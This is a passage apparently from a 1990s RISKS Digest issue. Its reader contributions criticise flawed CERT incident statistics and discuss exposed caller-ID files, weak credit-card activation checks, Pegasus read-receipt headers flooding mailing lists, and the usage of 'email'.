reports were somehow weeded out?  If it was verified, how was it verified?
The article doesn't say.

I wrote to Pfleeger with this question, and he responded that "the source of
these statistics is CERT" and I would "have to contact them for the
interpretation of their data."  In other words, Pfleeger, Cooper, and IEEE
COMPUTER published a table of statistics that the authors did not not
themselves understand.  So I wrote to CERT, and their response indicated
that an "incident" is a report, and that they "don't talk to law enforcement
people at all" to verify that an attack is real "unless a site requests us
to."

The abuse of statistics gets worse.  While the number of incidents in the
table is approximately doubling every year, so is the population of the
Internet (source: The Economist, July 1995).  In other words, the number of
incidents grows linearly with the size of the population, which is
completely unsurprising.  This fact is not mentioned anywhere in the
article.  Pfleeger argued (by email) that "technical and physical security
controls" have improved since 1988, and yet incidents have continued to
increase "in spite of improved protection."  That is an interesting
hypothesis but hardly a reason to ignore the growth of the Net as a possible
source of increased reports.  The CERT representative reported that she
didn't "know why the authors of the article didn't mention the relationship
between the number of incidents and the number of Internet users."

Similarly, the visibility of CERT has grown greatly since 1988, and this
could account for an increase in reported incidents.  Again, this is not
mentioned in the article.  Both Pfleeger and CERT say that measuring CERT's
visibility is a non-trivial task, and I agree.  Still, the effect should
have at least been mentioned in the article.

Footnote 1 of the table mentions that "some incidents have ongoing activity
for long periods of time (i.e., more than a year)."  I asked Pfleeger
whether "ongoing activity" meant "ongoing penetration of a compromised
system," or "ongoing interaction with CERT," since the phrase is ambiguous.
Pfleeger DIDN'T KNOW and suggested I ask CERT.  He also didn't know whether
the phrase "some incidents" referred to a majority or a (possibly
insignificant) minority.  By highlighting the incidents with long ongoing
activity, the table takes on a negative slant.  After all, one could just as
easily have focused on the opposite, saying that "some incidents lasted only
a few minutes."

My intuition and experience tell me that security incidents are indeed
increasing.  In other words, I believe the basic premise of the article.
Nevertheless, the article's reasoning is flawed and contributes only to the
prevalent misinformation about computer crime and security.

To see if any of my personal WWW home pages have been indexed by web
crawlers, I sometimes query the popular web search engines with my first and
last names.  Imagine my surprise when, amid the usual links, I found several
that referred to caller-id files!

Upon visiting the links, I discovered many text files containing a column of
phone numbers and a matching column of people's names.  The files were
broken up by month and year, and contained hundreds of listings each.  Some
of the names in the list were 'Pay Phone' and 'City of XXX' and 'State of
XXX'.  Often, a name and number would be repeated several times in a row,
presumably denoting multiple calls from one number.

When I removed all but the fully qualified host name from the URL address, I
was presented with the first HTML document that I'd found on this server.
It was functional, yet spartan: clearly intended for the page-developer's
use only.  From it, I ascertained that the phone lines from which the caller
-id's were taken were all named after different kinds of sexual activity.

Forgive me for jumping to conclusions, but I believe that these files were
created by a phone-sex service.  Perhaps they are used to identify satisfied
customers, or to help direct incoming calls to the proper 'talent'.

The RISKS: too many!  First, it is foolish to allow proprietary information
be stored on a server connected to the internet.  Second, any time that you
dial the phone, unless you're calling from a Pay Phone or the State of XXX,
the marketeers at the other end probably know who you are.  Finally, free
access to demographic data may be hazardous to your marriage, or job, or
whatever.

Sean Reifschneider reports that Social Security Administration employees
sold SSNs and "mother's maiden name" info to a credit-card fraud ring.  Many
credit card issuers require "activation" of newly-issued cards, i.e. the
recipient must call a toll-free number and give this kind of "identifying"
information before they can use the new card.

Actually, the weakest link is "the clerk who's paid $12K/year" at the
credit-card issuer.  Recently I received a new card, called the number, and
adamantly refused to give my SSN over the phone.  The somewhat flustered
clerk eventually activated my new card, having received only the credit-card
number and the zipcode (postal code) printed on the accompanying letter.  No
SSN, no "mother's maiden name," NOTHING else.

If all I need is the card and the letter, why pay off SSA employees?
I have written to the credit-card issuer, no response yet.

&gt;The "problem" is due to a new release of Pegasus which added a directed
&gt;confirmation header field as well as keeping the old confirmation header

The new header was added precisely because the old version was causing
problems with mailing list, but people have to upgrade the reading version
not the sending version to gain the full benefit.

However, this whole thing shows the common risk that users will demand
certain features of a product ("read" receipts are a very popular feature
of Pegasus) without realising the full implications (namely they will get
a reply from every Pegasus user on the mailing list, and possibly compromise
the privacy of those subscribers).

There is, however, a very simple solution for MajorDomo and probably for
listserv, just filter out the offending headers.  The standard MajorDomo
already filters out Return-Receipt-To:, a rather more common, non-standard
header, with similar effects.  Adding such filters to MajorDomo is a
reasonable local customisation.

Although there are now safe standards for achieving these results, which
shouldn't propagate through a properly configured list server, it will be
many years, if ever (commercial factors, rather than good technical design
are now controlling the e-mail market), before they are widely implemented,
and more ad hoc methods of meeting the market demand for this feature will
arrive first.

Two things about automatic e-mail confirmation, although the risk is nothing
new to RISKS readers...

Recently, on a mailing list I maintain, a Pegasus (the name of a Mac/Windows
e-mail reader) user posted a message with a line:

&gt; X-Confirm-Reading-To: &lt;e-mail address&gt;

This would be fine if Pegasus respected the field value when acting on
the presence of this field.  But Pegasus programmers apparently took the
RISK of assuming that they didn't have to.  Now every list member using
Pegasus is generating a confirmation message to the list.

While I tend to disagree with your preference for "e-mail" over "email",
that pales in comparison for my dislike of the use of "email" as other than
a mass noun.

Sentences like "send me an email" or "I received an email today" bother me
intensely.  "Mail" is a mass noun --- no native English speaker would
replace "an email" with "a mail" in the above sentences!  But many casually
do it with "email", even though "email" is just "electronic mail".

Listen everyone, it's "send me some email" or "send me an email message" or
"send me a piece of email" etc..

(So, maybe PGN is correct after all.  Maybe we do need the hyphen to remind
people that "e-mail"/"email" is a modification of "mail".)

bulk of the headers that one has to skip in a plain text reader.

Of course, that's assuming that each contributor only posts in one charset.
Multi-charset contributions would be worse still... I guess it'll be a long
time before I can put my name on my Esperanto postings properly (the r
should be \v{r}, and the i should be \'{\i}).
